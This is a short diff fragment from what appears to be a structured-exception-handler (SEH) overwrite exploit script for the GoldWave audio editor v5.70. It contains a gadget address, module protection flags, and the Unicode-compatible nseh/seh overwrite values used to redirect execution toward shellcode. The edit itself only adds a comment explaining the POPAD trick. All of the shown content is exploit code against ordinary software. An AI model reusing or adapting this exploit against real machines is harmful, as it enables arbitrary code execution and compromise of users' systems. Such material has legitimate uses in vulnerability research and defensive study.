@@ -7,7 +7,7 @@ from struct import pack
 # 0x006d000f : pop ecx # pop ebp # ret  | startnull,unicode,ascii {PAGE_EXECUTE_READ}
 # [GoldWave.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.70.0.0(C:\Program Files (x86)\GoldWave\GoldWave.exe)
 
-nseh = "\x61\x62"
+nseh = "\x61\x62" # overwrite next SEH with POPAD, this also populates all registers
 seh = "\x0f\x6d" # Unicode POP POP RETN from GoldWave.exe 
 
 # ebx is the register closest to our shellcode following the popad 
